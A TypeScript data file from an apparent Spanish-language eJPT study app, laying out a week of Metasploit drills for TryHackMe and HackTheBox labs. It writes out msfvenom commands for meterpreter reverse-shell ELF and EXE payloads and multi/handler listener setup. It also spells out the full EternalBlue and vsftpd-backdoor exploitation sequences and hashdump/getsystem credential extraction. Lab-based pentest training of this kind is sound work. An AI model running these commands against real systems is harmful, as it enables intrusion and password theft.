import { StudyWeek } from "@/lib/types";

/**
 * MES 1 / SEMANA 3 — Metasploit Framework a fondo (tu hueco declarado #1).
 * Semana global: 3
 */
export const month1Week3: StudyWeek = {
  id: "m1-w3",
  monthId: "m1",
  title: "Semana 3 — Metasploit Framework de memoria",
  goal: "Dejar 100% firme el flujo completo de Metasploit: search -> use -> show options -> set -> exploit -> sysinfo -> hashdump, y el uso correcto de multi/handler.",
  detailed: true,
  blocks: [
    {
      id: "m1-w3-b1",
      weekId: "m1-w3",
      order: 1,
      title: "msfconsole: search y use",
      objective: "Encontrar el módulo exploit correcto para un servicio conocido y seleccionarlo, sin ver apuntes.",
      durationMin: 45,
      type: "practice",
      theoryEs:
        "Metasploit organiza todo en MÓDULOS: exploit, auxiliary, post, payload, encoder. 'search' busca por nombre de servicio/CVE/plataforma; 'use' selecciona el módulo encontrado. El error más común es no filtrar bien la búsqueda (ej. buscar 'ftp' trae decenas de resultados) — usa términos específicos (nombre exacto del software + versión si la tienes).",
      practiceSteps: [
        "Abre la consola: msfconsole",
        "Busca módulos por nombre de servicio: search vsftpd",
        "Busca módulos por plataforma y tipo: search type:exploit platform:windows smb",
        "Selecciona un módulo por su ruta completa: use exploit/unix/ftp/vsftpd_234_backdoor",
        "Selecciona un módulo por su número de la lista de 'search': use 0",
        "Confirma qué módulo tienes activo: la línea de comandos cambia a msf6 exploit(...) >",
      ],
      subtopics: ["msf-search-use"],
      drills: [
        { id: "d1", promptEs: "Escribe el comando dentro de msfconsole para buscar módulos relacionados a 'eternalblue'.", answer: "search eternalblue" },
        { id: "d2", promptEs: "Escribe el comando para seleccionar el módulo exploit/windows/smb/ms17_010_eternalblue.", answer: "use exploit/windows/smb/ms17_010_eternalblue" },
        { id: "d3", promptEs: "Escribe el comando para buscar SOLO módulos tipo exploit de plataforma linux relacionados a 'samba'.", answer: "search type:exploit platform:linux samba" },
      ],
      glossary: [
        { en: "module", es: "módulo" },
        { en: "exploit module", es: "módulo de explotación" },
        { en: "auxiliary module", es: "módulo auxiliar" },
        { en: "payload", es: "carga útil" },
      ],
      resources: [
        { label: "TryHackMe — Metasploit: Introduction", url: "https://tryhackme.com/room/metasploitintro", platform: "TryHackMe" },
      ],
      closingChecklist: [
        "Escribo 'search <servicio>' y 'use <ruta del módulo>' sin ver apuntes",
        "Sé filtrar búsquedas con type: y platform:",
        "Entiendo la diferencia entre exploit, auxiliary y payload en una frase",
      ],
    },
    {
      id: "m1-w3-b2",
      weekId: "m1-w3",
      order: 2,
      title: "show options y set",
      objective: "Revisar las opciones requeridas de un módulo y configurarlas todas correctamente antes de ejecutar, sin dejar ninguna en blanco.",
      durationMin: 45,
      type: "practice",
      theoryEs:
        "'show options' lista TODOS los parámetros del módulo activo, marcando cuáles son 'Required: yes'. 'set <PARAM> <valor>' asigna el valor. El error #1 en examen es lanzar el exploit sin revisar 'show options' primero y dejar algo vacío (típicamente RHOSTS).",
      practiceSteps: [
        "Con un módulo ya seleccionado (use ...), revisa sus opciones: show options",
        "Identifica visualmente qué filas dicen 'Required: yes' y están vacías (Current Setting en blanco)",
        "Asigna el target: set RHOSTS <IP>",
        "Si el módulo lo requiere, asigna el puerto: set RPORT <puerto>",
        "Vuelve a correr 'show options' para confirmar que ya no queda nada requerido vacío",
      ],
      subtopics: ["msf-options"],
      drills: [
        { id: "d1", promptEs: "Escribe el comando para ver todas las opciones del módulo activo en msfconsole.", answer: "show options" },
        { id: "d2", promptEs: "Escribe el comando para configurar el target 10.10.10.90 como RHOSTS.", answer: "set RHOSTS 10.10.10.90" },
        { id: "d3", promptEs: "Escribe el comando para configurar el puerto remoto (RPORT) a 8080.", answer: "set RPORT 8080" },
      ],
      glossary: [
        { en: "required option", es: "opción requerida" },
        { en: "current setting", es: "valor actual" },
        { en: "target", es: "objetivo" },
      ],
      resources: [
        { label: "TryHackMe — Metasploit: Introduction", url: "https://tryhackme.com/room/metasploitintro", platform: "TryHackMe" },
      ],
      closingChecklist: [
        "Reviso 'show options' SIEMPRE antes de ejecutar un exploit (hábito, no opcional)",
        "Escribo 'set RHOSTS' y 'set RPORT' de memoria",
        "Detecto visualmente una opción 'Required: yes' que está vacía",
      ],
    },
    {
      id: "m1-w3-b3",
      weekId: "m1-w3",
      order: 3,
      title: "PUNTO CRÍTICO: set correcto de LHOST/LPORT/RHOSTS + msfvenom",
      objective: "Configurar correctamente LHOST/LPORT (tu máquina atacante) vs RHOSTS (la víctima) sin confundirlos, y generar un payload con msfvenom.",
      durationMin: 50,
      type: "drill",
      theoryEs:
        "Este es tu hueco declarado más específico. Regla fija para no confundirte nunca más: RHOSTS = la VÍCTIMA (a quién atacas). LHOST = TU máquina (Local Host, a dónde se conecta la reverse shell de vuelta). LPORT = el puerto en TU máquina que escucha la conexión. Si mezclas LHOST con la IP de la víctima, la shell nunca te llega.",
      comparisonTable: {
        caption: "RHOSTS vs LHOST vs LPORT — no te confundas nunca más",
        headers: ["Variable", "¿Qué es?", "¿De quién es la IP/puerto?", "Analogía"],
        rows: [
          ["RHOSTS", "Remote Host(s) — el objetivo a explotar", "IP de la VÍCTIMA", "A quién le vas a tocar la puerta"],
          ["LHOST", "Local Host — a dónde se conecta la shell de vuelta", "IP de TU máquina (atacante)", "Tu propia dirección, para que te llamen de vuelta"],
          ["LPORT", "Local Port — puerto que escucha en tu máquina", "Puerto en TU máquina", "El número de teléfono donde esperas la llamada"],
        ],
      },
      practiceSteps: [
        "Verifica tu propia IP (la que usarás como LHOST): ip a (o ifconfig tun0 si estás en VPN de THM/HTB)",
        "En un módulo exploit con payload reverse, configura ambos: set RHOSTS <IP víctima>, set LHOST <TU IP>",
        "Configura el puerto local de escucha: set LPORT 4444",
        "Genera un payload standalone con msfvenom (ej. Linux ELF reverse TCP): msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<TU IP> LPORT=4444 -f elf -o shell.elf",
        "Repite el mismo msfvenom pero para Windows (payload .exe): msfvenom -p windows/meterpreter/reverse_tcp LHOST=<TU IP> LPORT=4444 -f exe -o shell.exe",
      ],
      subtopics: ["msf-lhost-lport", "msfvenom"],
      drills: [
        { id: "d1", promptEs: "La víctima es 10.10.10.100 y tu IP de atacante (tun0) es 10.8.0.15. Escribe los DOS comandos 'set' necesarios (RHOSTS y LHOST) dentro de un módulo exploit ya seleccionado.", answer: "set RHOSTS 10.10.10.100 / set LHOST 10.8.0.15" },
        { id: "d2", promptEs: "Escribe el comando msfvenom para generar un payload ELF (Linux) meterpreter reverse_tcp, con LHOST=10.8.0.15 y LPORT=4444, guardado como shell.elf.", answer: "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.0.15 LPORT=4444 -f elf -o shell.elf" },
        { id: "d3", promptEs: "Escribe el comando msfvenom para generar un payload .exe (Windows) meterpreter reverse_tcp, con LHOST=10.8.0.15 y LPORT=4444, guardado como shell.exe.", answer: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.0.15 LPORT=4444 -f exe -o shell.exe" },
      ],
      glossary: [
        { en: "reverse shell", es: "shell inversa (la víctima se conecta a ti)" },
        { en: "bind shell", es: "shell enlazada (tú te conectas a la víctima)" },
        { en: "standalone payload", es: "payload independiente" },
      ],
      closingChecklist: [
        "Explico RHOSTS vs LHOST sin dudar, con la analogía propia",
        "Nunca puse la IP de la víctima en LHOST (ni viceversa) en los 3 drills",
        "Generé un payload ELF y un payload EXE con msfvenom exitosamente",
      ],
    },
    {
      id: "m1-w3-b4",
      weekId: "m1-w3",
      order: 4,
      title: "multi/handler: el listener",
      objective: "Levantar un listener multi/handler configurado para recibir una reverse shell de un payload generado con msfvenom.",
      durationMin: 45,
      type: "practice",
      theoryEs:
        "Cuando el payload NO se lanza desde dentro de un exploit de Metasploit (ej. lo subiste manualmente a un servidor vulnerable), necesitas un LISTENER separado que espere la conexión: exploit/multi/handler. Debe tener el MISMO payload, LHOST y LPORT que usaste al generar el payload con msfvenom, o nunca conecta.",
      practiceSteps: [
        "Selecciona el listener: use exploit/multi/handler",
        "Configura el MISMO payload que generaste: set payload linux/x86/meterpreter/reverse_tcp",
        "Configura LHOST y LPORT idénticos a los del payload: set LHOST <TU IP>, set LPORT 4444",
        "Pon el listener en background y corriendo: exploit -j -z (o solo 'run' en foreground)",
        "En otra terminal, ejecuta/copia el payload en la máquina víctima (simulada) y observa la sesión abrirse",
      ],
      subtopics: ["msf-multihandler"],
      drills: [
        { id: "d1", promptEs: "Escribe el comando para seleccionar el listener multi/handler.", answer: "use exploit/multi/handler" },
        { id: "d2", promptEs: "Escribe el comando para configurar el payload del listener como windows/meterpreter/reverse_tcp.", answer: "set payload windows/meterpreter/reverse_tcp" },
        { id: "d3", promptEs: "Escribe el comando para ejecutar el listener en background (job) sin bloquear la consola.", answer: "exploit -j -z" },
      ],
      glossary: [
        { en: "listener", es: "oyente / escucha" },
        { en: "background job", es: "tarea en segundo plano" },
        { en: "session", es: "sesión" },
      ],
      resources: [
        { label: "TryHackMe — Blue (EternalBlue + Metasploit, ideal para este bloque)", url: "https://tryhackme.com/room/blue", platform: "TryHackMe" },
      ],
      closingChecklist: [
        "Configuré un multi/handler con el mismo payload/LHOST/LPORT que un msfvenom generado antes",
        "Logré abrir al menos 1 sesión meterpreter usando el listener",
      ],
    },
    {
      id: "m1-w3-b5",
      weekId: "m1-w3",
      order: 5,
      title: "Post-explotación básica: sysinfo, getuid, hashdump",
      objective: "Dentro de una sesión meterpreter activa, obtener información del sistema y extraer hashes de contraseñas.",
      durationMin: 45,
      type: "practice",
      theoryEs:
        "Con una sesión meterpreter abierta, estos son los comandos de reconocimiento post-explotación más preguntados en eJPT: sysinfo (SO, arquitectura, hostname), getuid (con qué usuario corres), hashdump (extrae hashes SAM en Windows — requiere privilegios altos).",
      practiceSteps: [
        "Con una sesión meterpreter activa, revisa el sistema: sysinfo",
        "Revisa con qué usuario estás corriendo: getuid",
        "Lista procesos corriendo: ps",
        "Intenta extraer hashes (puede requerir privilegios/migrar de proceso primero): hashdump",
        "Si hashdump falla por permisos, intenta escalar primero: getsystem (Windows) y repite hashdump",
      ],
      subtopics: ["msf-sysinfo", "msf-hashdump"],
      drills: [
        { id: "d1", promptEs: "Dentro de meterpreter, escribe el comando para ver información del sistema objetivo (SO, arquitectura, hostname).", answer: "sysinfo" },
        { id: "d2", promptEs: "Dentro de meterpreter, escribe el comando para ver con qué usuario/privilegios estás corriendo la sesión.", answer: "getuid" },
        { id: "d3", promptEs: "Dentro de meterpreter, escribe el comando para extraer los hashes de contraseñas del sistema.", answer: "hashdump" },
      ],
      glossary: [
        { en: "meterpreter", es: "meterpreter (payload avanzado de Metasploit)" },
        { en: "privilege escalation", es: "escalada de privilegios" },
        { en: "SAM database", es: "base de datos SAM (Windows)" },
      ],
      resources: [
        { label: "TryHackMe — Blue", url: "https://tryhackme.com/room/blue", platform: "TryHackMe" },
      ],
      closingChecklist: [
        "Escribo sysinfo, getuid y hashdump sin ver apuntes",
        "Ejecuté hashdump con éxito al menos una vez en un lab (THM Blue)",
      ],
    },
    {
      id: "m1-w3-b6",
      weekId: "m1-w3",
      order: 6,
      title: "Drill de flujo completo Metasploit (de memoria, sin cortes)",
      objective: "Escribir de memoria y sin pausas la secuencia completa search->use->show options->set->exploit->sysinfo->hashdump para 2 escenarios distintos.",
      durationMin: 45,
      type: "drill",
      theoryEs: "Sin teoría nueva. Repetición pura para que la secuencia se vuelva automática (fijación por repetición, no memorización de un solo caso).",
      practiceSteps: [
        "Escenario A: escribe la secuencia completa para explotar EternalBlue (ms17_010) contra 10.10.10.200 desde tu IP 10.8.0.15",
        "Escenario B: escribe la secuencia completa para explotar vsftpd 2.3.4 backdoor contra 10.10.10.201",
        "Verifica cada línea contra la lista de comandos de los bloques B1-B5 antes de seguir",
        "Repite el Escenario A una tercera vez SIN ver ningún apunte",
      ],
      subtopics: ["msf-search-use", "msf-options", "msf-lhost-lport", "msf-sysinfo", "msf-hashdump", "msf-multihandler"],
      drills: [
        {
          id: "d1",
          promptEs: "Escribe la secuencia COMPLETA (7 líneas) para explotar ms17_010_eternalblue contra 10.10.10.200 desde tu IP 10.8.0.15, puerto de escucha 4444.",
          answer: "search eternalblue / use exploit/windows/smb/ms17_010_eternalblue / show options / set RHOSTS 10.10.10.200 / set LHOST 10.8.0.15 / set LPORT 4444 / exploit",
        },
        {
          id: "d2",
          promptEs: "Escribe la secuencia COMPLETA para explotar vsftpd_234_backdoor contra 10.10.10.201, luego revisar sysinfo y getuid dentro de la sesión.",
          answer: "search vsftpd / use exploit/unix/ftp/vsftpd_234_backdoor / show options / set RHOSTS 10.10.10.201 / exploit / sysinfo / getuid",
        },
      ],
      closingChecklist: [
        "Escribí ambas secuencias completas sin pausas largas ni errores de sintaxis",
        "La tercera repetición del Escenario A la hice 100% de memoria",
      ],
    },
    {
      id: "m1-w3-b7",
      weekId: "m1-w3",
      order: 7,
      title: "Skill-check Semana 3 + Lab de integración (Blue)",
      objective: "Aprobar el skill-check de Metasploit (70%+) y comprometer completamente la máquina 'Blue' de TryHackMe usando el flujo completo aprendido.",
      durationMin: 50,
      type: "checkpoint",
      theoryEs: "Sin teoría nueva. Verificación de que el hueco #1 (Metasploit) está cerrado antes de entrar a explotación general en la Semana 4.",
      practiceSteps: [
        "Toma el skill-check de la app (Simulacros > Skill-checks > Semana 3)",
        "Completa la sala 'Blue' de TryHackMe de principio a fin usando SOLO Metasploit (search, use, set, exploit, sysinfo, getuid, hashdump)",
        "Documenta cada comando que usaste en orden, como si fuera un mini-reporte",
      ],
      subtopics: ["msf-search-use", "msf-options", "msf-lhost-lport", "msf-sysinfo", "msf-hashdump", "msf-multihandler", "msfvenom"],
      resources: [
        { label: "TryHackMe — Blue", url: "https://tryhackme.com/room/blue", platform: "TryHackMe" },
      ],
      extraResources: [
        { label: "HackTheBox — Lame (retirada, gratis, Samba exploit clásico)", url: "https://app.hackthebox.com/machines/Lame", platform: "HackTheBox" },
      ],
      closingChecklist: [
        "Aprobé el skill-check de Semana 3 con 70% o más",
        "Comprometí 'Blue' documentando cada comando en orden",
        "Ya no dudo del set correcto de LHOST/LPORT/RHOSTS en ningún escenario nuevo",
      ],
    },
  ],
};
